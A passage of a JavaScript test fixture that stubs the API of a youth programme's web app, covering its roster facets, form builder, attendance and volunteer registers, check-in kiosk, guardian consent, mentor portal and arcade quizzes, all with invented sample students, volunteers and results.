    window.__rosterCalls = [];
    /* A real facet engine, not a stub that returns a fixed list — the thing
       under test is that filters COMBINE and that each facet's counts are
       computed against the OTHERS, and neither can be exercised by a stub that
       ignores its arguments. Mirrors the server's contract exactly. */
    var FACETS = ['centre', 'track', 'schoolType', 'status', 'consent', 'id', 'sex'];
    var fval = function (k, f) {
      if (f === 'centre') return k.centre || '';
      if (f === 'track') return k.track || '';
      if (f === 'schoolType') return k.schoolTypeKey || '';
      if (f === 'status') return k.status === 'active' ? 'active' : 'inactive';
      if (f === 'consent') return k.consentComplete ? 'complete' : 'incomplete';
      if (f === 'id') return k.token ? 'yes' : 'no';
      if (f === 'sex') return (k.sex || '').toLowerCase().slice(0, 1);
      return '';
    };
    window.NGGApi.admin.summer = {
      students: function (q, cohortId, opts) {
        var o = opts || {};
        window.__rosterCalls.push(JSON.stringify(o));
        var want = {};
        FACETS.forEach(function (f) {
          var v = (o[f] || '').trim();
          if (!v || v === 'all' || v === 'any') return;
          want[f] = (v === 'unknown' || v === 'none') ? '' : v;
        });
        var passes = function (k, skip) {
          return Object.keys(want).every(function (f) { return f === skip || fval(k, f) === want[f]; });
        };
        var facets = {};
        FACETS.forEach(function (f) {
          var c = {};
          KIDS.filter(function (k) { return passes(k, f); }).forEach(function (k) {
            var v = fval(k, f) || 'unknown';
            c[v] = (c[v] || 0) + 1;
          });
          facets[f] = c;
        });
        var rows = KIDS.filter(function (k) { return passes(k, null); });
        var applied = {};
        Object.keys(want).forEach(function (f) { applied[f] = want[f] === '' ? 'unknown' : want[f]; });
        return Promise.resolve({ students: rows, total: KIDS.length, matched: rows.length,
                                 truncated: false, applied: applied, facets: facets,
                                 schoolType: applied.schoolType || '',
                                 schoolTypes: { public: facets.schoolType.public || 0,
                                                private: facets.schoolType.private || 0,
                                                other: facets.schoolType.other || 0,
                                                unknown: facets.schoolType.unknown || 0 } });
      },
      studentUpdate: function (id, data) { window.__saved = { id: id, data: data }; return Promise.resolve({ ok: true }); },
      studentStatus: function () { return Promise.resolve({ ok: true }); },
      studentDelete: function () { return Promise.resolve({ ok: true }); },
      consent: function (id) {
        window.__consentCalls.push(id);
        return Promise.resolve({ consent: {
          student: { studentId: id, displayId: 'EG-26-001', fullName: 'Amina Alpha', age: 12, centre: 'Egbeda', track: 'Piano', enrolledAt: '2026-07-06T09:00:00Z' },
          guardian: { name: 'Mrs Alpha', phone: '08031110001', email: 'a@ex.co' },
          registration: { status: 'verified', verifiedAt: '2026-07-07T10:00:00Z', formVersion: 3, answers: { school: 'St Mary', allergies: 'Peanuts' } },
          items: [
            { type: 'participation', label: 'Program participation', priority: 0, required: true, status: 'granted', method: 'parent_link', actorName: 'Mrs Alpha', recordedAt: '2026-07-07T10:00:00Z' },
            { type: 'medical', label: 'Emergency medical care', priority: 0, required: true, status: 'granted', method: 'parent_link', actorName: 'Mrs Alpha', recordedAt: '2026-07-07T10:00:00Z' },
            { type: 'media', label: 'Photos & media', priority: 1, required: false, status: 'declined', method: 'parent_link', actorName: 'Mrs Alpha', recordedAt: '2026-07-07T10:00:00Z' },
          ],
          history: [
            { type: 'participation', status: 'granted', method: 'parent_link', actorName: 'Mrs Alpha', createdAt: '2026-07-07T10:00:00Z' },
            { type: 'medical', status: 'granted', method: 'parent_link', actorName: 'Mrs Alpha', createdAt: '2026-07-07T10:00:00Z' },
            { type: 'media', status: 'granted', method: 'parent_link', actorName: 'Mrs Alpha', createdAt: '2026-07-07T10:00:00Z' },
            { type: 'media', status: 'declined', method: 'staff', actorName: 'Desk', createdAt: '2026-07-08T09:00:00Z' },
          ],
          complete: true,
          programme: { name: 'LCASP 2026', website: 'next.afrovanguard.org.ng', phone: '+234 903 777 6318' },
          generatedAt: '2026-07-27T12:00:00Z', generatedBy: 'Admin',
        } });
      },
    };
    props = { cohortId: 'C1' };
  } else if (b === 'builder') {
    window.__published = null;
    var FIELDS = [
      { key: 'fullName', label: 'Full name', type: 'text', required: true, locked: true },
      { key: 'faculty', label: 'Faculty', type: 'choice', required: true, locked: true, options: ['AI & Technology', 'Music', 'Media'] },
      { key: 'course', label: 'Course', type: 'choice', required: true, locked: true, optionsFrom: 'faculty', options: ['Practical Coding', 'Piano', 'Graphics'] },
      { key: 'school', label: 'School', type: 'text' },
    ];
    // Assign INTO admin.registration — the builder calls
    // NGGApi.admin.registration.form / .publishForm, and the fixture's own
    // overrides for 'registration' win over anything set on 'admin'.
    window.NGGApi.admin.registration.form = function () {
      return Promise.resolve({ form: { formId: 'summer-reg', version: 3, name: 'Summer registration', note: 'n', fields: FIELDS },
        versions: [], fieldTypes: ['text','longtext','email','phone','number','date','choice','multi','yesno','file','section','info'] });
    };
    window.NGGApi.admin.registration.publishForm = function (formId, fields) { window.__published = fields; return Promise.resolve({ ok: true, version: 4 }); };
    props = { formId: 'summer-reg' };
  } else if (b === 'gatereg') {
    props = {
      g: 'G1', draftKey: 'ngg.test.draft', card: {}, gold: '#ffce54', goldInk: '#2b2100',
      inputS: { width: '100%' },
      ctx: { geo: { enabled: false }, form: { fields: [
        { key: 'firstName', label: 'First name', type: 'text', required: true },
        { key: 'lastName', label: 'Last name', type: 'text', required: true },
        { key: 'faculty', label: 'Faculty', type: 'choice', required: true, options: ['AI & Technology', 'Music', 'Media'] },
        { key: 'course', label: 'Course', type: 'choice', required: true, optionsFrom: 'faculty',
          options: ['Practical Coding', 'AI Tools Application', 'Piano', 'Guitar', 'Graphics'],
          optionsBy: { 'AI & Technology': ['Practical Coding', 'AI Tools Application'], 'Music': ['Piano', 'Guitar'], 'Media': ['Graphics'] } },
        { key: 'instrument', label: 'Which instrument?', type: 'text', required: true,
          showIf: { key: 'faculty', op: 'is', value: 'Music' } },
        { key: 'portfolio', label: 'Portfolio link', type: 'text',
          showIf: { key: 'faculty', op: 'in', value: 'Media, AI & Technology' } },
        { key: 'school', label: 'School', type: 'text' },
        { key: 'schoolType', label: 'School type', type: 'choice', options: ['Public', 'Private'],
          help: 'Public means a government school (state, LGEA or federal). Optional — leave blank if the child is not in school.' },
        { key: 'why', label: 'Why not?', type: 'text', showIf: { key: 'school', op: 'empty' } },
      ] } },
    };
    try { localStorage.removeItem('ngg.test.draft'); } catch (e) {}
  } else if (b === 'signin') {
    props = {};
    window.__logins = [];
    window.NGGApi.auth = { studentLogin: function (creds) {
      window.__logins.push(creds);
      var e = new Error('bad_credentials'); e.code = 'bad_credentials'; return Promise.reject(e);
    } };
  } else if (b === 'att' || b === 'kiosk') {
    props = {};
    var TODAY2 = new Date().toISOString().slice(0, 10);
    var CLOSED = new URLSearchParams(location.search).get('closed') === '1';
    var NOCAL  = new URLSearchParams(location.search).get('nocal') === '1';
    /* The stubs FILTER, because the server does. Search and situation moved
       server-side (they used to run in the browser over a roster already sorted
       and capped, so a chip could read 47 beside an empty table) — so a fixture
       that ignores the params would let a client that never sends them pass. */
    var ATT_KEEP = function (r, scenario) {
      switch (scenario) {
        case 'present': return !!r.presentToday;
        case 'absent':  return !r.presentToday;
        case 'never':   return (r.present || 0) === 0;
        case 'stopped': return !!r.stopped;
        case 'atrisk':  return (r.rate || 0) < 50;
        case 'late':    return (r.lates || 0) > 0;
        case 'half':    return (r.halfDays || 0) > 0;
        case 'flagged': return !!(r.state && r.state !== 'clear');
        case 'perfect': return (r.rate || 0) >= 100;
        default:        return true;
      }
    };
    var ATT_APPLY = function (rows, o, idKey) {
      o = o || {};
      var q = String(o.q || '').toLowerCase();
      var out = rows.filter(function (r) {
        if (!ATT_KEEP(r, o.scenario || 'all')) return false;
        if (q) {
          var hay = [r.fullName, r[idKey], r.track, r.role, r.centre, r.faculty].join(' ').toLowerCase();
          if (hay.indexOf(q) === -1) return false;
        }
        return true;
      });
      if (o.sort === 'name') out.sort(function (a, b) { return String(a.fullName).localeCompare(String(b.fullName)); });
      else if (o.sort === 'best') out.sort(function (a, b) { return (b.rate || 0) - (a.rate || 0); });
      else if (o.sort === 'seen') out.sort(function (a, b) { return String(b.lastSeen).localeCompare(String(a.lastSeen)); });
      return out;
    };
    var ATT_COUNTS = function (rows) {
      var k = {}, keys = ['all','present','absent','never','atrisk','late','half','flagged','perfect'];
      keys.forEach(function (x) { k[x] = x === 'all' ? rows.length : rows.filter(function (r) { return ATT_KEEP(r, x); }).length; });
      return k;
    };
    /* Two children on the SAME rate with opposite problems — the case a rate
       cannot express. Dupe Dara comes three days a week, every week; Bode Beta
       came every day and then stopped. Both 30%. */
    var ATT_KIDS = [
      { studentId: 'SUM-1', fullName: 'Amina Alpha', track: 'Music', centre: 'Ijaiye', present: 10, halfDays: 0, lates: 0, lastSeen: TODAY2, presentToday: true,  rate: 100, state: 'clear',   absences: 0,
        pattern: ['in','in','in','in','in','in','in','in','in','in'], missedRun: 0, stopped: false },
      { studentId: 'SUM-2', fullName: 'Bode Beta',   track: 'Tech',  centre: 'Egbeda', present: 4,  halfDays: 2, lates: 3, lastSeen: '2026-07-14', presentToday: false, rate: 30,  state: 'dormant', absences: 2,
        pattern: ['in','in','late','half','out','out','out','out','out','out'], missedRun: 6, stopped: true },
      { studentId: 'SUM-3', fullName: 'Chidi Gamma', track: 'Arts',  centre: 'Ijaiye', present: 9,  halfDays: 0, lates: 1, lastSeen: '2026-07-16', presentToday: false, rate: 90,  state: 'warned',  absences: 1,
        pattern: ['in','in','in','in','in','in','in','in','late','out'], missedRun: 1, stopped: false },
      { studentId: 'SUM-4', fullName: 'Dupe Dara',   track: 'Tech',  centre: 'Egbeda', present: 3,  halfDays: 0, lates: 0, lastSeen: TODAY2, presentToday: true, rate: 30, state: 'clear', absences: 0,
        pattern: ['in','out','out','in','out','out','in','out','out','in'], missedRun: 0, stopped: false },
    ];
    window.NGGApi.admin.summer = {
      attendance: function (cohortId, o) { window.__attOpts = o || {}; return Promise.resolve({ attendance: {
        cohort: { cohortId: 'C1', name: 'Summer 2026' },
        today: 2, absentToday: CLOSED ? 0 : 3, activeStudents: 5, sessionDays: 10,
        days: Array.from({ length: 14 }, function (_, i) {
          return { date: '2026-07-' + ('0' + (i + 6)).slice(-2), present: (i % 7 === 5 || i % 7 === 6) ? 0 : 4,
                   programmeDay: !(i % 7 === 5 || i % 7 === 6) };
        }),
        roster: ATT_APPLY(ATT_KIDS, o, 'studentId'),
        rosterTotal: ATT_KIDS.length, rosterMatched: ATT_APPLY(ATT_KIDS, o, 'studentId').length,
        rosterCap: 300, q: (o && o.q) || '', scenario: (o && o.scenario) || 'all', sort: (o && o.sort) || 'rate',
        /* The picker's options come from the CATALOGUE, not from the rows — a
           list derived from a centre-filtered roster collapses to the centre
           already chosen, and there is then no way to move to another. */
        centres: ['Egbeda', 'Ijaiye'],
        atRisk: [{ studentId: 'SUM-2', fullName: 'Bode Beta', rate: 30 }],
        recent: [],
        /* Every scenario's count, over the WHOLE register — a chip that counts
           the drawn page tells you how big the page is. 'never' is its own case:
           a child with no check-in at all is a different problem from one
           attending badly, and it used to hide inside "under 50%". */
        scenarios: ATT_COUNTS(ATT_KIDS),
        window: { from: '2026-07-06', to: TODAY2, days: 10, ranged: false, scope: NOCAL ? 'observed' : 'term' },
        programme: NOCAL
          ? { enabled: false, isProgrammeDay: true, today: TODAY2, nextDay: '', scannedDays: 10, termStart: '', termEnd: '', remaining: 0 }
          : { enabled: true, isProgrammeDay: !CLOSED, today: TODAY2, nextDay: '2026-07-20', scannedDays: 9,
              termStart: '2026-07-06', termEnd: '2026-08-28', remaining: 30 },
      } }); },
      /* The volunteers' own register. Their check-ins have always been in the
         attendance table; this screen simply never read them, because every
         query on it joins summer_students so volunteer scans cannot skew the
         children's rate. Each volunteer's denominator is programme days since
         THEY joined — Duty Dele started on the 20th and has not missed a day,
         which must read as 100%, not as 5 of 10. */
      volunteerAttendance: function (o) {
        window.__volOpts = o || {};
        var VOLS = [
          { volunteerId: 'VOL-MEN-26-001', fullName: 'Mentor Mary', role: 'mentor', centre: 'Ijaiye', faculty: 'Tech',
            joined: '2026-07-06', present: 10, expected: 10, rate: 100, lates: 0, halfDays: 0, onTimePct: 100,
            streak: 10, lastSeen: TODAY2, band: 'every', presentToday: true },
          { volunteerId: 'VOL-INS-26-002', fullName: 'Duty Dele', role: 'instructor', centre: 'Egbeda', faculty: 'Arts',
            joined: '2026-07-20', present: 5, expected: 5, rate: 100, lates: 2, halfDays: 0, onTimePct: 60,
            streak: 5, lastSeen: TODAY2, band: 'every', presentToday: true },
          { volunteerId: 'VOL-ADM-26-003', fullName: 'Absent Ada', role: 'admin', centre: 'Ijaiye', faculty: '',
            joined: '2026-07-06', present: 0, expected: 10, rate: 0, lates: 0, halfDays: 0, onTimePct: null,
            streak: 0, lastSeen: '', band: 'rare', presentToday: false },
        ];
        return Promise.resolve({ volunteers: {
          summary: { measurable: true, basis: 'calendar', scope: 'term', days: 10,
                     from: '2026-07-06', to: TODAY2, termStart: '2026-07-06', termEnd: '2026-08-28',
                     narrowed: false, pendingDays: 0,
                     kpis: { rate: 73, onTimePct: 88, sessions: 22, expected: 30, absences: 8,
                             lateSessions: 3, halfDays: 0, avgLateMinutes: 17, measured: 3, reliable: 2 },
                     trend: [], bands: [], byCentre: [], byRole: [],
                     caveats: ['Expected days are programme days since a volunteer joined. There is no rota in the system, so someone who agreed to come one day a week reads low here.'] },
          roster: ATT_APPLY(VOLS, o, 'volunteerId'),
          total: VOLS.length, matched: ATT_APPLY(VOLS, o, 'volunteerId').length,
          scenarios: ATT_COUNTS(VOLS),
          q: (o && o.q) || '', scenario: (o && o.scenario) || 'all', sort: (o && o.sort) || 'rate',
        } });
      },
      /* One day, opened from its bar. The chart could say a day was thin and
         nothing else; the follow-up question is always which people, and
         answering it meant exporting the register and reading dates by eye. */
      attendanceDay: function (date, o) {
        window.__dayAsked = { date: date, opts: o || {} };
        return Promise.resolve({ day: {
          date: date, programmeDay: true, centre: (o && o.centre) || '',
          students: [
            { id: 'SUM-1', name: 'Amina Alpha', meta: 'Music', centre: 'Ijaiye', in: true, status: 'present', lateMinutes: 0, halfDay: false, at: '08:12', method: 'qr' },
            { id: 'SUM-2', name: 'Bode Beta', meta: 'Tech', centre: 'Egbeda', in: false, status: 'absent', lateMinutes: 0, halfDay: false, at: '', method: '' },
            { id: 'SUM-3', name: 'Chidi Gamma', meta: 'Arts', centre: 'Ijaiye', in: true, status: 'late', lateMinutes: 24, halfDay: true, at: '09:31', method: 'qr' },
          ],
          volunteers: [
            { id: 'VOL-MEN-26-001', name: 'Mentor Mary', meta: 'mentor', centre: 'Ijaiye', joined: '2026-07-06', in: true, status: 'present', lateMinutes: 0, halfDay: false, at: '07:55', method: 'qr' },
            { id: 'VOL-ADM-26-003', name: 'Absent Ada', meta: 'admin', centre: 'Ijaiye', joined: '2026-07-06', in: false, status: 'absent', lateMinutes: 0, halfDay: false, at: '', method: '' },
          ],
          studentCounts: { total: 3, in: 2, out: 1, late: 1, onTime: 1, halfDays: 1 },
          volunteerCounts: { total: 2, in: 1, out: 1, late: 0, onTime: 1, halfDays: 0 },
        } });
      },
      insights: function () { return Promise.resolve({ insight: '· all good', source: 'rules', aiConfigured: false }); },
      absenceAlert: function () { var e = new Error('not_a_programme_day'); e.code = 'not_a_programme_day'; e.data = { nextDay: '2026-07-20' }; return Promise.reject(e); },
      archive: function () { return Promise.resolve({ students: 0 }); },
      /* The kiosk scan outcomes under test: a late arrival, and a refusal that
         carries who was refused and why. */
      checkin: function (token) {
        window.__scans = (window.__scans || []).concat([Array.prototype.slice.call(arguments)]);
        if (token === 'REFUSED') {
          var e = new Error('policy_suspended'); e.code = 'policy_suspended';
          e.data = { student: { fullName: 'Suspended Sam', studentId: 'SUM-9' },
                     message: 'Suspended until 2026-08-01 — barred from the premises.', state: { state: 'suspended' } };
          return Promise.reject(e);
        }
        return Promise.resolve({ student: { fullName: 'Late Lara', studentId: 'SUM-4', track: 'Music', photoUrl: '' },
                                 already: false, status: 'late', lateMinutes: 42, halfDay: 1,
                                 programmeDay: true, compliance: { state: 'warned' } });
      },
    };
  } else if (b === 'checkin') {
    /* The check-in desk. Its whole job is telling an operator, at arm's length
       in a noisy hall, what just happened to the card they scanned. */
    window.__scans = [];
    window.__vibes = [];
    navigator.vibrate = function (p) { window.__vibes.push(p); return true; };
    var CASES = {
      OKTOKEN:   { student: { fullName: 'Adaeze Okonkwo', photoUrl: '/assets/logo.png', centre: 'Ijaiye', track: 'Music', kind: 'student' }, already: false, status: 'present' },
      AGAINTOKEN:{ student: { fullName: 'Adaeze Okonkwo', photoUrl: '/assets/logo.png', centre: 'Ijaiye', track: 'Music', kind: 'student' }, already: true,  status: 'present' },
      LATETOKEN: { student: { fullName: 'Bode Adeyemi', photoUrl: '', centre: 'Egbeda', track: 'Tech', kind: 'student' }, already: false, status: 'late', lateMinutes: 22 },
    };
    window.NGGApi.public.gate = {
      checkin: function (g, token) {
        window.__scans.push(token);
        if (CASES[token]) return Promise.resolve(CASES[token]);
        var err = new Error(token === 'SUSPENDED' ? 'policy_suspended' : 'qr_unassigned');
        err.code = token === 'SUSPENDED' ? 'policy_suspended' : 'qr_unassigned';
        err.status = 400;
        err.data = { student: { fullName: 'Chidi Banned' } };
        return Promise.reject(err);
      },
      dutyClose: function () { return Promise.resolve({ message: 'ok' }); },
    };
    try { localStorage.removeItem('ngg.gate.mute'); localStorage.removeItem('ngg.gate.q.G1'); } catch (e) {}
    props = { g: 'G1', ctx: { centre: 'Ijaiye' }, card: { background: '#12203f' },
              inputS: { width: '100%' }, gold: '#ffce54', goldInk: '#2b2100' };
  } else if (b === 'consent') {
    /* Recording a guardian's decision about whether a child may be named and
       pictured on the public site. What matters is the payload: the wrong type
       or a missing method silently records the wrong permission for a real
       child, and it looks identical on screen. */
    window.__consent = [];
    window.NGGApi.admin.members = window.NGGApi.admin.members || {};
    window.NGGApi.admin.members.consent = function (memberId, type, status, method) {
      window.__consent.push({ memberId: memberId, type: type, status: status, method: method });
      var st = {};
      st[type] = { status: status, method: method, by: 'Admin User', at: '2026-07-28T10:00:00Z' };
      return Promise.resolve({ consent: st, mayName: type === 'site_visibility' && status === 'granted' });
    };
    var seeded = new URLSearchParams(location.search).get('seeded') === '1';
    props = { member: { memberId: 'NGG-2025-0777', fullName: 'Ngozi Balogun', role: 'member',
      consent: seeded
        ? { gated: true, handle: 'ngg0777', mayName: true,
            site_visibility: { status: 'granted', method: 'Paper form', by: 'Prior Staff', at: '2026-06-01T09:00:00Z' } }
        : { gated: true, handle: 'ngg0777', mayName: false } } };
  } else if (b === 'mentor') {
    /* The Mentor Portal. Two things here can look right on screen and be wrong:
       the V3 trend, whose bar heights ARE the data, and the mentee scope, which
       is the link between an admin's pairing and what the mentor sees. Both are
       measured rather than eyeballed. */
    window.useAuth = function () { return { isSignedIn: true, openSignIn: function () {} }; };
    var MTS_MINE = [
      { studentId: 'K1', kind: 'member', fullName: 'Adaeze Okonkwo', track: 'Robotics', photoUrl: '',
        starredToday: 3, note: 'Led the group', byMe: true, v3: { verbal: 5, vocal: 4, visual: 4, note: '' } },
      { studentId: 'K2', kind: 'member', fullName: 'Bolanle Adeyemi', track: 'Design', photoUrl: '',
        starredToday: 0, note: '', byMe: false, v3: null },
    ];
    var MTS_ALL = MTS_MINE.concat([
      { studentId: 'K3', kind: 'member', fullName: 'Chidera Nwosu', track: 'Robotics', photoUrl: '',
        starredToday: 0, note: '', byMe: false, v3: null },
      { studentId: 'K4', kind: 'member', fullName: 'Damilola Bakare', track: 'Coding', photoUrl: '',
        starredToday: 0, note: '', byMe: false, v3: null },
    ]);
    /* 1, 3 and 5 out of 5 → 20%, 60% and 100% of the track. Chosen so that a
       bar drawn against the wrong denominator, or overflowing its track, is
       arithmetic rather than an opinion. */
    var MTS_WK = ['2026-W27','2026-W28','2026-W29','2026-W30','2026-W31','2026-W32','2026-W33','2026-W34'];
    var MTS_RATED = { '2026-W30': [1, 3, 5], '2026-W32': [3, 3, 3], '2026-W34': [5, 4, 4] };
    var MTS_V3 = MTS_WK.map(function (p) {
      var r = MTS_RATED[p];
      return r ? { period: p, rated: true, verbal: r[0], vocal: r[1], visual: r[2], note: '' }
               : { period: p, rated: false, verbal: 0, vocal: 0, visual: 0, note: '' };
    });
    window.__mtrSaves = [];
    var MTS_CHILD = {
      subject: { subjectId: 'K1', kind: 'member', fullName: 'Adaeze Okonkwo', centre: 'Egbeda', track: 'Robotics', photoUrl: '', status: 'active' },
      mentor: { mentorId: 'MEN-1', name: 'Nkechi Mentor', isMine: true },
      stars: { total: 24, recent: [{ date: '2026-08-18', stars: 3, category: 'discipline', note: 'Led the group', givenById: 'M1' }] },
      v3: MTS_V3,
      attendance: { total: 41, last90: 22, lastSeen: '2026-08-15' },
      meetings: [
        { id: 2, metOn: '2026-08-11', kind: 'guardian', discussed: 'Guardian says she has not been sleeping.',
          agreed: 'Check in every Monday.', concern: true, mentorId: 'M1', mentorName: 'Nkechi Mentor', mine: true, createdAt: '' },
        { id: 1, metOn: '2026-07-28', kind: 'one-to-one', discussed: 'Wants to lead the demo.',
          agreed: 'She opens it.', concern: false, mentorId: 'M9', mentorName: 'Segun Mentor', mine: false, createdAt: '' },
      ],
      goals: [
        { id: 1, goal: 'Open the robotics demo.', dueOn: '2026-09-12', status: 'open', closedOn: '', setById: 'M1', setByName: 'Nkechi Mentor', overdue: false, createdAt: '' },
        { id: 2, goal: 'Read one book a fortnight.', dueOn: '2026-08-01', status: 'open', closedOn: '', setById: 'M1', setByName: 'Nkechi Mentor', overdue: true, createdAt: '' },
        { id: 3, goal: 'Join the Tuesday coding club.', dueOn: '2026-06-30', status: 'done', closedOn: '2026-06-24', setById: 'M1', setByName: 'Nkechi Mentor', overdue: false, createdAt: '' },
      ],
      kinds: ['one-to-one', 'group', 'call', 'guardian', 'check-in'],
      canWrite: true, role: 'mentor', rank: 'mentor', sessionId: 'S-2026',
    };
    window.NGGApi.member = window.NGGApi.member || {};
    window.NGGApi.member.mentorRoster = function (centre, scope) {
      var mine = (scope || 'mine') === 'mine';
      window.__mtrScope = scope;
      return Promise.resolve({
        today: '2026-08-18', period: '2026-W34', categories: ['discipline'], presets: [],
        role: 'mentor', rank: 'mentor', centre: 'Egbeda', centres: ['Egbeda'], needsCentre: false,
        scope: mine ? 'mine' : 'centre', mineCount: 2,
        mentor: { name: 'Nkechi Mentor', centre: 'Egbeda', department: '', programmes: ['ngg'] },
        students: mine ? MTS_MINE : MTS_ALL,
      });
    };
    window.NGGApi.member.mentorChild = function (id) { window.__mtrChild = id; return Promise.resolve(MTS_CHILD); };
    window.NGGApi.member.mentorMeeting = function (subjectId, m) { window.__mtrSaves.push({ subjectId: subjectId, m: m }); return Promise.resolve({ id: 3 }); };
    window.NGGApi.member.mentorMeetingDelete = function () { return Promise.resolve({}); };
    window.NGGApi.member.mentorGoal = function (subjectId, g) { window.__mtrSaves.push({ subjectId: subjectId, g: g }); return Promise.resolve({ id: 4 }); };
    window.NGGApi.member.mentorGoalStatus = function (subjectId, id, status) { window.__mtrSaves.push({ status: status, id: id }); return Promise.resolve({}); };
    window.NGGApi.member.mentorAttention = function () {
      return Promise.resolve({
        concerns: [{ id: 2, subjectId: 'K1', subjectType: 'member', metOn: '2026-08-11', kind: 'guardian',
                     discussed: 'Guardian says she has not been sleeping.', agreed: 'Check in every Monday.',
                     mentorName: 'Nkechi Mentor', centre: 'Egbeda', fullName: 'Adaeze Okonkwo' }],
        overdue: [{ id: 2, subjectId: 'K1', goal: 'Read one book a fortnight.', dueOn: '2026-08-01',
                    setByName: 'Nkechi Mentor', centre: 'Egbeda', fullName: 'Adaeze Okonkwo' }],
        centres: ['Egbeda'], centre: '', rank: 'lead',
      });
    };
    /* lead=1 makes the same fixture answer as a lead mentor, which is what
       decides whether the centre-wide queue exists at all. (No backticks in
       here: this whole block lives inside a template literal.) */
    if (new URLSearchParams(location.search).get('lead') === '1') {
      var plain = window.NGGApi.member.mentorRoster;
      window.NGGApi.member.mentorRoster = function (centre, scope) {
        return plain(centre, scope).then(function (r) { r.rank = 'lead'; return r; });
      };
    }
    props = {};
  } else if (b === 'arcade') {
    /* The Arcade grades on the server, so the interesting client behaviour is
       what it SENDS: the answers must line up with the questions they were
       typed against, and a round must be submitted exactly once however the
       clock and the Finish button race. Both are recorded here. */
    var fast = new URLSearchParams(location.search).get('fast') === '1';
    window.__submits = [];
    window.__starts = [];
    var GAMES = [
      { key: 'maths', name: 'Number Rush', icon: '\u26a1', blurb: 'Twenty sums against the clock.',
        skill: 'Mental arithmetic', kind: 'type', questions: 20, seconds: 90, best: 140, plays: 3, tier: 2, isDaily: false },
      { key: 'naija', name: 'Naija Know-How', icon: 'NG', blurb: 'States, capitals and civics.',
        skill: 'General knowledge', kind: 'choice', questions: 12, seconds: 100, best: 0, plays: 0, tier: 1, isDaily: true },
      { key: 'spell', name: 'Spell It Right', icon: 'Ab', blurb: 'One of these four is spelt correctly.',
        skill: 'Spelling', kind: 'choice', questions: 15, seconds: 90, best: 95, plays: 1, tier: 2, isDaily: false },
      { key: 'word', name: 'Word Untangle', icon: 'WW', blurb: 'Put the letters back in order.',
        skill: 'Vocabulary', kind: 'type', questions: 12, seconds: 120, best: 0, plays: 0, tier: 1, isDaily: false },
    ];
    window.NGGApi.member = window.NGGApi.member || {};
    window.NGGApi.member.arcade = {
      home: function () { return Promise.resolve({
        games: GAMES, daily: 'naija', dailyDone: false, streak: 4, stars: 7,
        programme: 'summer', totalPlays: 4 }); },
      board: function (game, scope) {
        window.__lastBoard = { game: game, scope: scope };
        return Promise.resolve({
          scope: scope, game: game, programme: 'summer',
          board: [
            { rank: 1, first: 'Zainab', initial: 'K.', centre: 'Ijaiye', best: 264, plays: 5, correct: 40, isMe: false },
            { rank: 2, first: 'Emeka',  initial: 'O.', centre: 'Egbeda', best: 198, plays: 2, correct: 22, isMe: false },
          ],
          // Off the end of the visible list — must still be shown.
          me: { rank: 37, first: 'Amaka', initial: 'A.', centre: 'Egbeda', best: 61, plays: 9, correct: 8, isMe: true },
        });
      },
      start: function (game) {
        window.__starts.push(game);
        return Promise.resolve({
          roundId: 'AR-TESTROUND', game: game, tier: 1, kind: 'choice',
          // Deliberately short in fast mode so the auto-submit-on-expiry path
          // can be exercised without waiting out a real round.
          seconds: fast ? 1 : 100,
          questions: [
            { q: 'Capital of Ekiti State?',  options: ['Akure', 'Ado-Ekiti', 'Osogbo', 'Ibadan'] },
            { q: 'Capital of Bayelsa State?', options: ['Yenagoa', 'Asaba', 'Calabar', 'Uyo'] },
            { q: 'Capital of Zamfara State?', options: ['Gusau', 'Sokoto', 'Katsina', 'Dutse'] },
          ],
        });
      },
      submit: function (roundId, answers) {
        window.__submits.push({ roundId: roundId, answers: answers.slice() });
        /* In fast mode the grade is deliberately SLOW. That is what makes the
           double-submit test real: the round stays on screen while the
           countdown keeps ticking, which is exactly the window a player on a
           poor connection sits in. Resolve it immediately and the component
           unmounts before the next tick, so an unguarded submit looks fine. */
        var body = {
          score: 47, correct: 2, total: 3, seconds: 12.4,
          breakdown: { base: 20, sweep: 0, speed: 7 },
          best: 47, newBest: true, daily: true, streak: 5,
          marks: [
            { i: 0, ok: true,  answer: '1', given: '1' },
            { i: 1, ok: false, answer: '0', given: '2' },
            { i: 2, ok: true,  answer: '0', given: '0' },
          ],
        };
        if (!fast) return Promise.resolve(body);
        return new Promise(function (r) { setTimeout(function () { r(body); }, 1200); });
      },
    };
    /* The Math Lab hangs off the same screen. Two strands, three cleared, and
       one level shut behind a prerequisite in ANOTHER strand — the shape the
       ladder actually has, so the grouped view and the "Needs …" line are
       both exercised rather than merely rendered. */
    window.__mathStarts = [];
    window.__mathSubmits = [];
    var LV = [
      { level: 1, name: 'Number & Numeration', band: 'JSS 1\u20132', icon: '\u2460',
        strand: 'Number', needs: [],
        blurb: 'Factors, multiples, fractions.', questions: 12, seconds: 300 },
      { level: 2, name: 'Algebraic Processes', band: 'JSS 3', icon: '\u2461',
        strand: 'Algebra', needs: [],
        blurb: 'Expanding and factorising.', questions: 12, seconds: 330 },
      { level: 3, name: 'Indices & Logarithms', band: 'SSS 1', icon: '\u2462',
        strand: 'Algebra', needs: [2],
        blurb: 'The laws of indices.', questions: 12, seconds: 330 },
      { level: 4, name: 'Surds', band: 'SSS 1\u20132', icon: '\u2463',
        strand: 'Algebra', needs: [3],
        blurb: 'Rationalising a denominator.', questions: 10, seconds: 330 },
      { level: 5, name: 'Quadratic Equations', band: 'SSS 2', icon: '\u2464',
        strand: 'Algebra', needs: [2],
        blurb: 'Roots and the discriminant.', questions: 12, seconds: 360 },
    ];
    window.NGGApi.member.mathlab = {
      board: function () {
        return Promise.resolve({
          passPct: 70, cleared: 2, total: LV.length, open: 2,
          strands: ['Number', 'Algebra'],
          levels: LV.map(function (l, i) {
            var cleared = i <= 1;
            var waiting = l.needs.filter(function (n) { return n > 2; })
                                 .map(function (n) { return LV[n - 1].name; });
            // Same promotion rule the server applies: never cleared →
            // Foundation, cleared → Standard, cleared at 90%+ → Stretch.
            // Level 1 is cleared at 92 and level 2 at 74, so the stub carries
            // one of each rather than two of the same.
            var best = cleared ? (i === 0 ? 92 : 74) : 0;
            var stage = !cleared ? 1 : (best >= 90 ? 3 : 2);
            return Object.assign({}, l, {
              unlocked: waiting.length === 0, waitingOn: waiting, cleared: cleared,
              stage: stage, stageName: ['Foundation', 'Standard', 'Stretch'][stage - 1],
              bestScore: best, bestCorrect: cleared ? 11 : 0, attempts: cleared ? 1 : 0,
            });
          }),
        });
      },
      start: function (level) {
        window.__mathStarts.push(level);
        return Promise.resolve({
          roundId: 'ML-TESTPAPER', level: level, name: 'Indices & Logarithms', band: 'SSS 1',
          seconds: fast ? 1 : 300,
          stage: 1, stageName: 'Foundation',
          stageBlurb: 'Mostly the gentler forms, with one to reach for.',
